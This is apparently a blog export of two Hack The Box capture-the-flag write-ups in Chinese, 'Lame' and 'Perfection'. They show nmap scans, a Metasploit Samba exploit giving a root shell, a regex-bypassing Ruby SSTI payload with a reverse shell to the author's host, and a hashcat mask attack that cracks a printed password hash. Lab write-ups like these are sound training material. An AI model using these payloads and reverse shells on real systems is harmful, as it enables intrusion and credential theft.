class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">mkdir</span> lame;<span class="hljs-built_in">cd</span> lame      <br>                                                                                   <br>┌──(x㉿kali)-[~/lame]<br>└─$ <span class="hljs-built_in">export</span> ip=10.10.10.3                            <br><br><br>┌──(x㉿kali)-[~/lame]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -Pn -A -T4 <span class="hljs-variable">$ip</span>       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 23:43 CST<br>NSE Timing: About 99.82% <span class="hljs-keyword">done</span>; ETC: 23:44 (0:00:00 remaining)<br>Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 99.82% <span class="hljs-keyword">done</span>; ETC: 23:44 (0:00:00 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.3<br>Host is up (0.095s latency).<br>Not shown: 996 filtered tcp ports (no-response)<br>PORT    STATE SERVICE     VERSION<br>21/tcp  open  ftp         vsftpd 2.3.4<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to 10.10.14.53<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      vsFTPd 2.3.4 - secure, fast, stable<br>|_End of status<br>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:<span class="hljs-built_in">cd</span> (DSA)<br>|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 2.6.23 (92%), DD-WRT v24-sp1 (Linux 2.4.36) (90%), Belkin N300 WAP (Linux 2.6.30) (90%), Control4 HC-300 home controller (90%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (90%), Dell Integrated Remote Access Controller (iDRAC5) (90%), Dell Integrated Remote Access Controller (iDRAC6) (90%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (90%), Linux 2.4.21 - 2.4.31 (likely embedded) (90%), Linux 2.4.7 (90%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>| smb-os-discovery: <br>|   OS: Unix (Samba 3.0.20-Debian)<br>|   Computer name: lame<br>|   NetBIOS computer name: <br>|   Domain name: hackthebox.gr<br>|   FQDN: lame.hackthebox.gr<br>|_  System time: 2024-07-15T11:36:42-04:00<br>|_clock-skew: mean: 1h52m31s, deviation: 2h49m45s, median: -7m31s<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>|_smb2-time: Protocol negotiation failed (SMB2)<br><br>TRACEROUTE (using port 445/tcp)<br>HOP RTT      ADDRESS<br>1   93.06 ms 10.10.14.1<br>2   93.14 ms 10.10.10.3<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 73.79 seconds<br></code></pre></td></tr></table></figure><p>有四個開放端口：</p><ul><li>21&#x2F;tcp open ftp vsftpd 2.3.4</li><li>22&#x2F;tcp open OpenSSH4.7p1</li><li>139&#x2F;tcp open netbios-ssn Samba smbd 3.X - 4.X</li><li>445&#x2F;tcp open netbios-ssn Samba smbd 3.0.20-Debian</li></ul><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><hr><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><hr><p>ftp anonymous login成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~/lame]<br>└─$ ftp <span class="hljs-variable">$ip</span>                                 <br>Connected to 10.10.10.3.<br>220 (vsFTPd 2.3.4)<br>Name (10.10.10.3:x): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt;<br></code></pre></td></tr></table></figure><p>看一下有沒有東西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">pwd</span><br>Remote directory: /<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||32481|).<br>150 Here comes the directory listing.<br>226 Directory send OK.<br>ftp&gt; passive<br>Passive mode: off; fallback to active mode: off.<br>ftp&gt; <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>沒東西，繼續看其他的端口</p><h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><hr><p>google 搜尋<code>smbd 3.0.20-Debian exploit</code>找到<a href="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/">metasploit的module</a><br><img src="/2024/07/12/Hackthebox-Perfection-Writeup/png" alt="alt text"></p><h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><hr><p>最後直接取得reverse shell而且還是root權限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~/lame]<br>└─$ msfconsole                            <br>Metasploit tip: Use the edit <span class="hljs-built_in">command</span> to open the currently active module <br><span class="hljs-keyword">in</span> your editor<br>                                                  <br> ______________________________________<br>/ it looks like you<span class="hljs-string">&#x27;re trying to run a \</span><br><span class="hljs-string">\ module                               /</span><br><span class="hljs-string"> --------------------------------------</span><br><span class="hljs-string"> \</span><br><span class="hljs-string">  \</span><br><span class="hljs-string">     __</span><br><span class="hljs-string">    /  \</span><br><span class="hljs-string">    |  |</span><br><span class="hljs-string">    @  @</span><br><span class="hljs-string">    |  |</span><br><span class="hljs-string">    || |/</span><br><span class="hljs-string">    || ||</span><br><span class="hljs-string">    |\_/|</span><br><span class="hljs-string">    \___/</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">       =[ metasploit v6.4.9-dev                           ]</span><br><span class="hljs-string">+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]</span><br><span class="hljs-string">+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]</span><br><span class="hljs-string">+ -- --=[ 9 evasion                                       ]</span><br><span class="hljs-string"></span><br><span class="hljs-string">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="hljs-string"></span><br><span class="hljs-string">use exploit/multi/samba/usermap_script</span><br><span class="hljs-string">msf6 &gt; use exploit/multi/samba/usermap_script</span><br><span class="hljs-string">[*] No payload configured, defaulting to cmd/unix/reverse_netcat</span><br><span class="hljs-string">msf6 exploit(multi/samba/usermap_script) &gt; show options</span><br><span class="hljs-string"></span><br><span class="hljs-string">Module options (exploit/multi/samba/usermap_script):</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Name     Current Setting  Required  Description</span><br><span class="hljs-string">   ----     ---------------  --------  -----------</span><br><span class="hljs-string">   CHOST                     no        The local client address</span><br><span class="hljs-string">   CPORT                     no        The local client port</span><br><span class="hljs-string">   Proxies                   no        A proxy chain of format type:host:port[,ty</span><br><span class="hljs-string">                                       pe:host:port][...]</span><br><span class="hljs-string">   RHOSTS                    yes       The target host(s), see https://docs.metas</span><br><span class="hljs-string">                                       ploit.com/docs/using-metasploit/basics/usi</span><br><span class="hljs-string">                                       ng-metasploit.html</span><br><span class="hljs-string">   RPORT    139              yes       The target port (TCP)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Payload options (cmd/unix/reverse_netcat):</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Name   Current Setting  Required  Description</span><br><span class="hljs-string">   ----   ---------------  --------  -----------</span><br><span class="hljs-string">   LHOST  192.168.0.52     yes       The listen address (an interface may be spec</span><br><span class="hljs-string">                                     ified)</span><br><span class="hljs-string">   LPORT  4444             yes       The listen port</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Exploit target:</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Id  Name</span><br><span class="hljs-string">   --  ----</span><br><span class="hljs-string">   0   Automatic</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">View the full module info with the info, or info -d command.</span><br><span class="hljs-string"></span><br><span class="hljs-string">msf6 exploit(multi/samba/usermap_script) &gt; set RHOSTS 10.10.10.3</span><br><span class="hljs-string">RHOSTS =&gt; $ip</span><br><span class="hljs-string">msf6 exploit(multi/samba/usermap_script) &gt; set LHOST 10.10.14.53</span><br><span class="hljs-string">LHOST =&gt; 10.10.14.53</span><br><span class="hljs-string">msf6 exploit(multi/samba/usermap_script) &gt; run</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] Started reverse TCP handler on 10.10.14.53:4444 </span><br><span class="hljs-string">[*] Command shell session 1 opened (10.10.14.53:4444 -&gt; 10.10.10.3:35060) at 2024-07-16 00:09:03 +0800</span><br><span class="hljs-string"></span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=0(root) gid=0(root)</span><br><span class="hljs-string">cd ~</span><br><span class="hljs-string">cat root.txt</span><br><span class="hljs-string">&lt;root flag&gt;</span><br><span class="hljs-string">cat /home/makis/user.txt    </span><br><span class="hljs-string">&lt;user flag&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hackthebox Machines</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hackthebox-Perfection Writeup</title>
    <link href="/2024/07/12/Hackthebox-Perfection-Writeup/"/>
    <url>/2024/07/12/Hackthebox-Perfection-Writeup/</url>
    
    <content type="html"><![CDATA[<p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/Perfection.png"></p><h2 id="信息蒐集"><a href="#信息蒐集" class="headerlink" title="信息蒐集"></a>信息蒐集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">─(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">export</span> ip=10.10.11.253<br>                                                                                   <br>┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">mkdir</span> perfection; <span class="hljs-built_in">cd</span> perfection<br>                                                                                   <br>┌──(x㉿kali)-[~/perfection]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -Pn -sV -sC <span class="hljs-variable">$ip</span><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 04:43 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.253<br>Host is up (0.18s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 80:e4:79:e8:59:28:<span class="hljs-built_in">df</span>:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)<br>|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)<br>80/tcp open  http    nginx<br>|_http-title: Weighted Grade Calculator<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 26.95 seconds<br></code></pre></td></tr></table></figure><p>發現兩個端口開放：</p><ul><li>22&#x2F;tcp open  ssh     OpenSSH 8.9p1</li><li>80&#x2F;tcp open  http    nginx</li></ul><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><hr><p>進入網頁後發現這是一個計算加權成績的計算機。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image.png"></p><p>在<code>About Us</code>頁面中，顯示團隊有兩位成員<strong>smith</strong>和<strong>miller</strong>，頁腳顯示使用<strong>Webrick 1.7.0</strong>。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-1.png"></p><p>Google後發現沒有漏洞可利用，看起來是沒有。</p><p>用wappalyzer插件看到網站使用了<strong>Ruby</strong>。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-2.png"></p><p>進入&#x2F;weighted-grade頁面，發現有注入點。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-3.png"></p><h3 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h3><hr><p>感覺有機會進行SSTI模板注入，用<a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">Hackthetricks</a>的payload <code>&lt;%= </code>id<code> %&gt;</code>試試看。</p><p>用burpsuite將payload用urlencode後發現被偵測為惡意行為。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-4.png"></p><h3 id="繞過Ruby-Regex"><a href="#繞過Ruby-Regex" class="headerlink" title="繞過Ruby Regex"></a>繞過Ruby Regex</h3><p>發現這篇<a href="https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/">文章</a>提到Ruby的Regex可以用\n來繞過。將原本的payload改成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span><br>&lt;%= `<span class="hljs-built_in">id</span>` %&gt;<br></code></pre></td></tr></table></figure><p>urlencode後：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>%0A&lt;%25%3D`<span class="hljs-built_in">id</span>`+%25&gt;<br></code></pre></td></tr></table></figure><p>成功執行。</p><p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-8.png"></p><p>接著去<a href="https://www.revshells.com/">https://www.revshells.com/</a> 生成一個urlencode的ruby reverse shell payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>%0A&lt;%25%3d+`ruby%20-rsocket%20-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.53%22%2C9000%29%29%27`+%25&gt;<br></code></pre></td></tr></table></figure><p>在本地啟動netcat listener：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ nc -lvnp 9000                       <br>listening on [any] 9000 ...<br>connect to [10.10.14.53] from (UNKNOWN) [10.10.11.253] 49506<br></code></pre></td></tr></table></figure><h2 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h2><hr><h3 id="使用-Python-升級到完全交互式-shell"><a href="#使用-Python-升級到完全交互式-shell" class="headerlink" title="使用 Python 升級到完全交互式 shell"></a>使用 Python 升級到完全交互式 shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-built_in">export</span> SHELL=bash<br><span class="hljs-built_in">export</span> TERM=xterm-256color<br></code></pre></td></tr></table></figure><p>按 <code>ctrl-z</code> 將shell送到後台：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br></code></pre></td></tr></table></figure><p>進行信息蒐集：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">susan@perfection:~/ruby_app$ <span class="hljs-built_in">id</span><br>uid=1001(susan) gid=1001(susan) <span class="hljs-built_in">groups</span>=1001(susan),27(<span class="hljs-built_in">sudo</span>)<br></code></pre></td></tr></table></figure><p>查看郵件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">susan@perfection:~$ <span class="hljs-built_in">ls</span> -la /var/mail<br>total 12<br>drwxrwsr-x 2 root mail 4096 May 14 2023 .<br>drwxr-xr-x 13 root root 4096 Oct 27 2023 ..<br>-rw-r----- 1 root susan 625 May 14 2023 susan<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">susan@perfection:~$ <span class="hljs-built_in">cat</span> /var/mail/susan<br>Due to our transition to Jupiter Grades because of the PupilPath data breach, I<br>thought we should also migrate our credentials (<span class="hljs-string">&#x27;our&#x27;</span> including the other<br>students<br><span class="hljs-keyword">in</span> our class) to the new platform. I also suggest a new password specification,<br>to make things easier <span class="hljs-keyword">for</span> everyone. The password format is:<br>&#123;firstname&#125;_&#123;firstname backwards&#125;_&#123;randomly generated <span class="hljs-built_in">integer</span> between 1 and<br>1,000,000,000&#125;<br>Note that all letters of the first name should be converted into lowercase.<br>Please hit me with updates on the migration when you can. I am currently<br>registering our university with the platform.<br>- Tina, your delightful student<br></code></pre></td></tr></table></figure><p>發現Migration文件夾：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">susan@perfection:~$ <span class="hljs-built_in">ls</span> -la Migration/<br>total 16<br>drwxr-xr-x 2 root root 4096 Oct 27 2023 .<br>drwxr-x--- 7 susan susan 4096 Feb 26 09:41 ..<br>-rw-r--r-- 1 root root 8192 May 14 2023 pupilpath_credentials.db<br></code></pre></td></tr></table></figure><p>查看資料庫文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> pupilpath_credentials.db<br></code></pre></td></tr></table></figure><p>取得hash：<code>abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f</code></p><p>辨識hash類型：<br><img src="/2024/07/12/Hackthebox-Perfection-Writeup/image-9.png"></p><h3 id="使用-Hashcat破解密碼"><a href="#使用-Hashcat破解密碼" class="headerlink" title="使用 Hashcat破解密碼"></a>使用 Hashcat破解密碼</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ hashcat -h | grep -i sha2-256    <span class="hljs-comment">#查看sha2-256的mode</span><br>   1400 | SHA2-256 <br><br>┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;susan_nasus_&quot;</span> &gt; word     <span class="hljs-comment">#前綴</span><br>                                                     <br>┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f&quot;</span> &gt;hash.txt<br><br>┌──(x㉿kali)-[~]<br>└─$ hashcat -m 1400 -a 6 hash.txt word ?d?d?d?d?d?d?d?d?d -O<br><br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>==================================================================================================================================================<br>* Device <span class="hljs-comment">#1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i5-11320H @ 3.20GHz, 6832/13729 MB (2048 MB allocatable), 8MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 31<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br><br>Optimizers applied:<br>* Optimized-Kernel<br>* Zero-Byte<br>* Precompute-Init<br>* Early-Skip<br>* Not-Salted<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br>* Raw-Hash<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 2 MB<br><br>Dictionary cache built:<br>* Filename..: word<br>* Passwords.: 1<br>* Bytes.....: <br><br>13<br>* Keyspace..: 1000000000<br>* Runtime...: 0 secs<br><br>The wordlist or mask that you are using is too small.<br>This means that hashcat cannot use the full parallel power of your device(s).<br>Unless you supply more work, your cracking speed will drop.<br>For tips on supplying more work, see: https://hashcat.net/faq/morework<br><br>Approaching final keyspace - workload adjusted.           <br><br>Cracking performance lower than expected?                 <br><br>* Append -w 3 to the commandline.<br>  This can cause your screen to lag.<br><br>* Update your backend API runtime / driver the right way:<br>  https://hashcat.net/faq/wrongdriver<br><br>* Create more work items to make use of your parallelization power:<br>  https://hashcat.net/faq/morework<br><br>abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 1400 (SHA2-256)<br>Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f<br>Time.Started.....: Fri Jul 12 08:11:50 2024 (59 secs)<br>Time.Estimated...: Fri Jul 12 08:12:49 2024 (0 secs)<br>Kernel.Feature...: Optimized Kernel<br>Guess.Base.......: File (word), Left Side<br>Guess.Mod........: Mask (?d?d?d?d?d?d?d?d?d) [9], Right Side<br>Guess.Queue.Base.: 1/1 (100.00%)<br>Guess.Queue.Mod..: 1/1 (100.00%)<br>Speed.#1.........:  2036.5 kH/s (0.05ms) @ Accel:256 Loops:512 Thr:1 Vec:16<br>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)<br>Progress.........: 125967360/1000000000 (12.60%)<br>Rejected.........: 0/125967360 (0.00%)<br>Restore.Point....: 0/1 (0.00%)<br>Restore.Sub.#1...: Salt:0 Amplifier:125966848-125967360 Iteration:0-512<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: susan_nasus_758539210 -&gt; susan_nasus_643759210<br>Hardware.Mon.#1..: Temp: 52c Util: 26%<br></code></pre></td></tr></table></figure><p>取得密碼<code>susan_nasus_413759210</code>。</p><p>最後使用sudo權限查看root flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cat</span> /root/root.txt<br>&lt;flag&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hackthebox Machines</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
